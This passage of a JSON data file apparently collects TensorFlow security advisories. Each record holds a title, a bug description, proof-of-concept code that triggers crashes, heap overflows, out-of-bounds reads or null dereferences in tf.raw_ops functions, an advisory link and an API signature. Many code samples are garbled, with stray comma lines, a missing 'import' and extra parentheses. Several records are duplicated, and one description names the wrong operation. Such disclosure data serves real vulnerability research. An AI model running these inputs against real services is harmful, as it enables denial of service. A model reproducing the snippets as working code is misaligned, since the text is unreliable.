    "API Signature": "tf.raw_ops.RaggedTensorToTensor(\n    shape,\n    values,\n    default_value,\n    row_partition_tensors,\n    row_partition_types,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference in `CompressElement`\n      ",
    "Bug description": "It is possible to trigger a null pointer dereference in TensorFlow by passing an invalid input to  tf.raw_ops.CompressElement :",
    "Sample Code": " tensorflow as tf\n\ntf.raw_ops.CompressElement(components=[[]])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9qf-r67m-p7cg",
    "API Signature": "tf.raw_ops.CompressElement(\n    components, name=None\n)\n"
  },
  {
    "Title": "\n        Floating point exception in `SparseDenseCwiseDiv`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.SparseDenseCwiseDiv  is vulnerable to a division by 0 error:",
    "Sample Code": "import numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv( \n  sp_indices=np.array([[4]]),\n  sp_values=np.array([-400]),\n  sp_shape=np.array([647.]),\n  ]),\n  dense=np.array([0]))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hp4c-x6r7-6555",
    "API Signature": "tf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices, sp_values, sp_shape, dense, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `tf.raw_ops.SparseCountSparseOutput`\n      ",
    "Bug description": "Passing invalid arguments (e.g., discovered via fuzzing) to  tf.raw_ops.SparseCountSparseOutput  results in segfault.",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wvjw-p9f5-vq28",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Crash in `tf.strings.substr` due to `CHECK`-fail\n      ",
    "Bug description": "An attacker can cause a denial of service via  CHECK -fail in   tf.strings.substr  with invalid arguments:",
    "Sample Code": " tensorflow as tf\ntf.strings.substr(input='abc', len=1, pos=[1,2])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mmq6-q8r3-48fm",
    "API Signature": "tf.strings.substr(\n    input, pos, len, unit='BYTE', name=None\n)\n"
  },
  {
    "Title": "\n        Crash in `tf.transpose` with complex inputs\n      ",
    "Bug description": "Passing a complex argument to  tf.transpose  at the same time as passing  conjugate=True  argument results in a crash:",
    "Sample Code": " tensorflow as tf\ntf.transpose(conjugate=True, a=complex(1))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xqfj-cr6q-pc8w",
    "API Signature": "tf.transpose(\n    a, perm=None, conjugate=False, name='transpose'\n)\n"
  },
  {
    "Title": "\n        Interpreter crash from `tf.io.decode_raw`\n      ",
    "Bug description": "The implementation of  tf.io.decode_raw  produces incorrect results and crashes the Python interpreter when combining  fixed_length  and wider datatypes.",
    "Sample Code": " tensorflow as tf\n\ntf.io.decode_raw(tf.constant([\"1\",\"2\",\"3\",\"4\"]), tf.uint16, fixed_length=4)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8pmx-p244-g88h",
    "API Signature": "tf.io.decode_raw(\n    input_bytes, out_type, little_endian=True, fixed_length=None, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `tf.raw_ops.CTCLoss`\n      ",
    "Bug description": "Incomplete validation in  tf.raw_ops.CTCLoss  allows an attacker to trigger an OOB read from heap:",
    "Sample Code": "inputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)\nlabels_values = tf.constant([], shape=[0], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ,\n                   ignore_longer_outputs_than_inputs=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7",
    "API Signature": "tf.raw_ops.CTCLoss(\n    inputs,\n    labels_indices,\n    labels_values,\n    sequence_length,\n    preprocess_collapse_repeated=False,\n    ctc_merge_repeated=True,\n    ignore_longer_outputs_than_inputs=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `tf.raw_ops.CTCLoss`\n      ",
    "Bug description": "Incomplete validation in  tf.raw_ops.CTCLoss  allows an attacker to trigger an OOB read from heap:",
    "Sample Code": "inputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)\nlabels_values = tf.constant([], shape=[0], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ,\n                   ignore_longer_outputs_than_inputs=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7",
    "API Signature": "tf.raw_ops.CTCLoss(\n    inputs,\n    labels_indices,\n    labels_values,\n    sequence_length,\n    preprocess_collapse_repeated=False,\n    ctc_merge_repeated=True,\n    ignore_longer_outputs_than_inputs=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `tf.raw_ops.CTCLoss`\n      ",
    "Bug description": "Incomplete validation in  tf.raw_ops.CTCLoss  allows an attacker to trigger an OOB read from heap:",
    "Sample Code": "inputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)\nlabels_values = tf.constant([], shape=[0], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ,\n                   ignore_longer_outputs_than_inputs=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7",
    "API Signature": "tf.raw_ops.CTCLoss(\n    inputs,\n    labels_indices,\n    labels_values,\n    sequence_length,\n    preprocess_collapse_repeated=False,\n    ctc_merge_repeated=True,\n    ignore_longer_outputs_than_inputs=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `BandedTriangularSolve`\n      ",
    "Bug description": "An attacker can trigger a heap buffer overflow in Eigen implementation of  tf.raw_ops.BandedTriangularSolve :",
    "Sample Code": "import numpy as np\n  \nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)\nrhs_array = np.array([1,1])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)\n)\ntf.raw_ops.BandedTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2xgj-xhgf-ggjv",
    "API Signature": "tf.raw_ops.BandedTriangularSolve(\n    matrix, rhs, lower=True, adjoint=False, name=None\n)\n"
  },
  {
    "Title": "\n        Invalid validation in `QuantizeAndDequantizeV2`\n      ",
    "Bug description": "The validation in  tf.raw_ops.QuantizeAndDequantizeV2  allows invalid values for  axis  argument:",
    "Sample Code": "input_tensor = tf.constant([0.0], shape=[1], dtype=float)\ninput_min = tf.constant(-10.0)\ninput_max = tf.constant(-10.0)\n\ntf.raw_ops.QuantizeAndDequantizeV2(\n  input=input_tensor, input_min=input_min, input_max=input_max,\n  signed_input=False, num_bits=1, range_given=False, round_mode='HALF_TO_EVEN',\n  ,\n  narrow_range=False, axis=-2)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mq5c-prh3-3f3h",
    "API Signature": "tf.raw_ops.QuantizeAndDequantizeV2(\n    input,\n    input_min,\n    input_max,\n    signed_input=True,\n    num_bits=8,\n    range_given=False,\n    round_mode='HALF_TO_EVEN',\n    narrow_range=False,\n    axis=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseReshape`\n      ",
    "Bug description": "Incomplete validation in  SparseReshape  results in a denial of service based on a  CHECK -failure.",
    "Sample Code": "input_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)\ninput_shape = tf.zeros([11], dtype=tf.int64)\nnew_shape = tf.zeros([1], dtype=tf.int64)\n\ntf.raw_ops.SparseReshape(input_indices=input_indices,\n    input_shape=input_shape,\n    ,\n    new_shape=new_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f",
    "API Signature": "tf.raw_ops.SparseReshape(\n    input_indices, input_shape, new_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseReshape`\n      ",
    "Bug description": "Incomplete validation in  SparseReshape  results in a denial of service based on a  CHECK -failure.",
    "Sample Code": "input_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)\ninput_shape = tf.zeros([11], dtype=tf.int64)\nnew_shape = tf.zeros([1], dtype=tf.int64)\n\ntf.raw_ops.SparseReshape(input_indices=input_indices,\n    input_shape=input_shape,\n    ,\n    new_shape=new_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f",
    "API Signature": "tf.raw_ops.SparseReshape(\n    input_indices, input_shape, new_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseReshape`\n      ",
    "Bug description": "Incomplete validation in  SparseReshape  results in a denial of service based on a  CHECK -failure.",
    "Sample Code": "input_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)\ninput_shape = tf.zeros([11], dtype=tf.int64)\nnew_shape = tf.zeros([1], dtype=tf.int64)\n\ntf.raw_ops.SparseReshape(input_indices=input_indices,\n    input_shape=input_shape,\n    ,\n    new_shape=new_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9rpc-5v9q-5r7f",
    "API Signature": "tf.raw_ops.SparseReshape(\n    input_indices, input_shape, new_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseSparseMinimum`\n      ",
    "Bug description": "Incomplete validation in  SparseAdd  results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:",
    "Sample Code": "a_indices = tf.ones([45, 92], dtype=tf.int64)\na_values = tf.ones([45], dtype=tf.int64)\na_shape = tf.ones([1], dtype=tf.int64)\nb_indices = tf.ones([1, 1], dtype=tf.int64)\nb_values = tf.ones([1], dtype=tf.int64)\nb_shape = tf.ones([1], dtype=tf.int64)\n                    \ntf.raw_ops.SparseSparseMinimum(a_indices=a_indices,\n    a_values=a_values,\n    a_shape=a_shape,\n    b_indices=b_indices,\n    b_values=b_values,\n    ,\n    b_shape=b_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq",
    "API Signature": "tf.raw_ops.SparseSparseMinimum(\n    a_indices, a_values, a_shape, b_indices, b_values, b_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseSparseMinimum`\n      ",
    "Bug description": "Incomplete validation in  SparseAdd  results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:",
    "Sample Code": "a_indices = tf.ones([45, 92], dtype=tf.int64)\na_values = tf.ones([45], dtype=tf.int64)\na_shape = tf.ones([1], dtype=tf.int64)\nb_indices = tf.ones([1, 1], dtype=tf.int64)\nb_values = tf.ones([1], dtype=tf.int64)\nb_shape = tf.ones([1], dtype=tf.int64)\n                    \ntf.raw_ops.SparseSparseMinimum(a_indices=a_indices,\n    a_values=a_values,\n    a_shape=a_shape,\n    b_indices=b_indices,\n    b_values=b_values,\n    ,\n    b_shape=b_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq",
    "API Signature": "tf.raw_ops.SparseSparseMinimum(\n    a_indices, a_values, a_shape, b_indices, b_values, b_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseSparseMinimum`\n      ",
    "Bug description": "Incomplete validation in  SparseAdd  results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:",
    "Sample Code": "a_indices = tf.ones([45, 92], dtype=tf.int64)\na_values = tf.ones([45], dtype=tf.int64)\na_shape = tf.ones([1], dtype=tf.int64)\nb_indices = tf.ones([1, 1], dtype=tf.int64)\nb_values = tf.ones([1], dtype=tf.int64)\nb_shape = tf.ones([1], dtype=tf.int64)\n                    \ntf.raw_ops.SparseSparseMinimum(a_indices=a_indices,\n    a_values=a_values,\n    a_shape=a_shape,\n    b_indices=b_indices,\n    b_values=b_values,\n    ,\n    b_shape=b_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gv26-jpj9-c8gq",
    "API Signature": "tf.raw_ops.SparseSparseMinimum(\n    a_indices, a_values, a_shape, b_indices, b_values, b_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseAdd`\n      ",
    "Bug description": "Incomplete validation in  SparseAdd  results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:",
    "Sample Code": "a_indices = tf.zeros([10, 97], dtype=tf.int64)\na_values = tf.zeros([10], dtype=tf.int64)\na_shape = tf.zeros([0], dtype=tf.int64)\n\nb_indices = tf.zeros([0, 0], dtype=tf.int64)\nb_values = tf.zeros([0], dtype=tf.int64)\nb_shape = tf.zeros([0], dtype=tf.int64)\n  \nthresh = 0\n\ntf.raw_ops.SparseAdd(a_indices=a_indices,\n                    a_values=a_values,\n                    a_shape=a_shape,\n                    b_indices=b_indices,\n                    b_values=b_values,\n                    b_shape=b_shape,\n                    ,\n                    thresh=thresh)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64",
    "API Signature": "tf.raw_ops.SparseAdd(\n    a_indices,\n    a_values,\n    a_shape,\n    b_indices,\n    b_values,\n    b_shape,\n    thresh,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseAdd`\n      ",
    "Bug description": "Incomplete validation in  SparseAdd  results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:",
    "Sample Code": "a_indices = tf.zeros([10, 97], dtype=tf.int64)\na_values = tf.zeros([10], dtype=tf.int64)\na_shape = tf.zeros([0], dtype=tf.int64)\n\nb_indices = tf.zeros([0, 0], dtype=tf.int64)\nb_values = tf.zeros([0], dtype=tf.int64)\nb_shape = tf.zeros([0], dtype=tf.int64)\n  \nthresh = 0\n\ntf.raw_ops.SparseAdd(a_indices=a_indices,\n                    a_values=a_values,\n                    a_shape=a_shape,\n                    b_indices=b_indices,\n                    b_values=b_values,\n                    b_shape=b_shape,\n                    ,\n                    thresh=thresh)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64",
    "API Signature": "tf.raw_ops.SparseAdd(\n    a_indices,\n    a_values,\n    a_shape,\n    b_indices,\n    b_values,\n    b_shape,\n    thresh,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `SparseAdd`\n      ",
    "Bug description": "Incomplete validation in  SparseAdd  results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:",
    "Sample Code": "a_indices = tf.zeros([10, 97], dtype=tf.int64)\na_values = tf.zeros([10], dtype=tf.int64)\na_shape = tf.zeros([0], dtype=tf.int64)\n\nb_indices = tf.zeros([0, 0], dtype=tf.int64)\nb_values = tf.zeros([0], dtype=tf.int64)\nb_shape = tf.zeros([0], dtype=tf.int64)\n  \nthresh = 0\n\ntf.raw_ops.SparseAdd(a_indices=a_indices,\n                    a_values=a_values,\n                    a_shape=a_shape,\n                    b_indices=b_indices,\n                    b_values=b_values,\n                    b_shape=b_shape,\n                    ,\n                    thresh=thresh)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cjc7-49v2-jp64",
    "API Signature": "tf.raw_ops.SparseAdd(\n    a_indices,\n    a_values,\n    a_shape,\n    b_indices,\n    b_values,\n    b_shape,\n    thresh,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB and null pointer dereference in `RaggedTensorToTensor`\n      ",
    "Bug description": "Due to lack of validation in  tf.raw_ops.RaggedTensorToTensor , an attacker can exploit an undefined behavior if input arguments are empty:",
    "Sample Code": "shape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = tf.constant(404, dtype=tf.int64)\nrow = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)\nrows = [row]\ntypes = ['ROW_SPLITS']\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=shape, values=values, default_value=default_value, \n  , \n  row_partition_tensors=rows, row_partition_types=types)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rgvq-pcvf-hx75",
    "API Signature": "tf.raw_ops.RaggedTensorToTensor(\n    shape,\n    values,\n    default_value,\n    row_partition_tensors,\n    row_partition_types,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by zero in TFLite's implementation of `BatchToSpaceNd`\n      ",
    "Bug description": "The implementation of the  BatchToSpaceNd  TFLite operator is  vulnerable to a division by zero error :",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cfx7-2xpc-8w4h",
    "API Signature": null
  },
  {
    "Title": "\n        Division by zero in TFLite's implementation of `SpaceToBatchNd`\n      ",
    "Bug description": "The implementation of the  SpaceToBatchNd  TFLite operator is  vulnerable to a division by zero error :",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v52p-hfjf-wg88",
    "API Signature": "tf.raw_ops.SpaceToBatchND(\n    input, block_shape, paddings, name=None\n)\n"
  },
  {
    "Title": "\n        Division by zero in TFLite's implementation of `Split`\n      ",
    "Bug description": "The implementation of the  Split  TFLite operator is  vulnerable to a division by zero error :",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-97wf-p777-86jq",
    "API Signature": "tf.split(\n    value, num_or_size_splits, axis=0, num=None, name='split'\n)\n"
  },
  {
    "Title": "\n        Division by zero in TFLite's implementation of `OneHot`\n      ",
    "Bug description": "The implementation of the  OneHot  TFLite operator is  vulnerable to a division by zero error :",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j8qh-3xrq-c825",
    "API Signature": "tf.one_hot(\n    indices,\n    depth,\n    on_value=None,\n    off_value=None,\n    axis=None,\n    dtype=None,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow and undefined behavior in `FusedBatchNorm`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.FusedBatchNorm  is vulnerable to a heap buffer overflow:",
    "Sample Code": "import numpy as np\n\nx = tf.zeros([10, 10, 10, 1], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n  x=x, scale=scale, offset=offset, mean=mean, variance=variance, \n  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,\n  ,\n  data_format=data_format, is_training=is_training)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9xh4-23q4-v6wr",
    "API Signature": "tf.raw_ops.FusedBatchNorm(\n    x,\n    scale,\n    offset,\n    mean,\n    variance,\n    epsilon=0.0001,\n    exponential_avg_factor=1,\n    data_format='NHWC',\n    is_training=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail due to integer overflow\n      ",
    "Bug description": "An attacker can trigger a denial of service via a  CHECK -fail in  caused by an integer overflow in constructing a new tensor shape:",
    "Sample Code": "input_layer = 2**60-1\nsparse_data = tf.raw_ops.SparseSplit(\n    split_dim=1, \n    indices=[(0, 0), (0, 1), (0, 2), \n    (4, 3), (5, 0), (5, 1)],\n    values=[1.0, 1.0, 1.0, 1.0, 1.0, 1.0],\n    shape=(input_layer, input_layer),\n    num_split=2,\n    name=None\n    )\n    )",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xvjm-fvxx-q3hv",
    "API Signature": "tf.raw_ops.SparseSplit(\n    split_dim, indices, values, shape, num_split, name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB read in `tf.raw_ops.Dequantize`\n      ",
    "Bug description": "Due to lack of validation in  tf.raw_ops.Dequantize , an attacker can trigger a read from outside of bounds of heap allocated data:",
    "Sample Code": "input_tensor=tf.constant(\n  [75, 75, 75, 75, -6, -9, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10], shape=[5, 10], dtype=tf.int32)\ninput_tensor=tf.cast(input_tensor, dtype=tf.quint8)\nmin_range = tf.constant([-10], shape=[1], dtype=tf.float32)\nmax_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)\n  \ntf.raw_ops.Dequantize( \n  input=input_tensor, min_range=min_range, max_range=max_range, mode='SCALED',\n  ,\n  narrow_range=True, axis=0, dtype=tf.dtypes.float32)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c45w-2wxr-pp53",
    "API Signature": "tf.raw_ops.Dequantize(\n    input,\n    min_range,\n    max_range,\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=-1,\n    dtype=tf.dtypes.float32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `CTCBeamSearchDecoder`\n      ",
    "Bug description": "Due to lack of validation in  tf.raw_ops.CTCBeamSearchDecoder , an attacker can trigger denial of service via segmentation faults:",
    "Sample Code": "inputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)\nsequence_length = tf.constant([11, -43, -92, 11, -89, -83, -35, -100],\nshape=[8], dtype=tf.int32)\nbeam_width = 10\ntop_paths = 3\nmerge_repeated = True\n\ntf.raw_ops.CTCBeamSearchDecoder(\n  inputs=inputs, sequence_length=sequence_length, beam_width=beam_width,\n  ,\n  top_paths=top_paths, merge_repeated=merge_repeated)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vq2r-5xvm-3hc3",
    "API Signature": "tf.raw_ops.CTCBeamSearchDecoder(\n    inputs,\n    sequence_length,\n    beam_width,\n    top_paths,\n    merge_repeated=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `FractionalAvgPoolGrad`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.FractionalAvgPoolGrad  is vulnerable to a heap buffer overflow:",
    "Sample Code": "orig_input_tensor_shape = tf.constant([1, 3, 2, 3], shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([2], shape=[1, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\n\ntf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  ,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6f89-8j54-29xf",
    "API Signature": "tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Undefined behavior and `CHECK`-fail in `FractionalMaxPoolGrad`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.FractionalMaxPoolGrad  triggers an undefined behavior if one of the input tensors is empty:",
    "Sample Code": "orig_input = tf.constant([1], shape=[1], dtype=tf.int64)\norig_output = tf.constant([1], shape=[1], dtype=tf.int64)\nout_backprop = tf.constant([1, 1], shape=[2, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64) \ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  ,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x8h6-xgqx-jqgp",
    "API Signature": "tf.raw_ops.FractionalMaxPoolGrad(\n    orig_input,\n    orig_output,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `AvgPool3DGrad`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.AvgPool3DGrad  is vulnerable to a heap buffer overflow:",
    "Sample Code": "orig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)\ngrad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.AvgPool3DGrad(\n  orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides,\n  ,\n  padding=padding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v6r6-84gr-92rm",
    "API Signature": "tf.raw_ops.AvgPool3DGrad(\n    orig_input_shape,\n    grad,\n    ksize,\n    strides,\n    padding,\n    data_format='NDHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `MaxPool3DGradGrad`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.MaxPool3DGradGrad  is vulnerable to a heap buffer overflow:",
    "Sample Code": "values = [0.01] * 11\norig_input = tf.constant(values, shape=[11, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    ,\n    strides=strides, padding=padding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7cqx-92hp-x6wh",
    "API Signature": "tf.raw_ops.MaxPool3DGradGrad(\n    orig_input,\n    orig_output,\n    grad,\n    ksize,\n    strides,\n    padding,\n    data_format='NDHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Undefined behavior in `MaxPool3DGradGrad`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.MaxPool3DGradGrad  exhibits undefined behavior by dereferencing null pointers backing attacker-supplied empty tensors:",
    "Sample Code": "orig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    ,\n    strides=strides, padding=padding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-828x-qc2p-wprq",
    "API Signature": "tf.raw_ops.MaxPool3DGradGrad(\n    orig_input,\n    orig_output,\n    grad,\n    ksize,\n    strides,\n    padding,\n    data_format='NDHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `MaxPoolGradWithArgmax`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.MaxPoolGradWithArgmax  is vulnerable to a division by 0:",
    "Sample Code": "input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nargmax = tf.constant([], shape=[0], dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n\ntf.raw_ops.MaxPoolGradWithArgmax(\n  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  ,\n  padding='SAME', include_batch_in_index=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9vpm-rcf4-9wqw",
    "API Signature": "tf.raw_ops.MaxPoolGradWithArgmax(\n    input,\n    grad,\n    argmax,\n    ksize,\n    strides,\n    padding,\n    include_batch_in_index=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Overflow/denial of service in `tf.raw_ops.ReverseSequence`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.ReverseSequence  allows for stack overflow and/or  CHECK -fail based denial of service.",
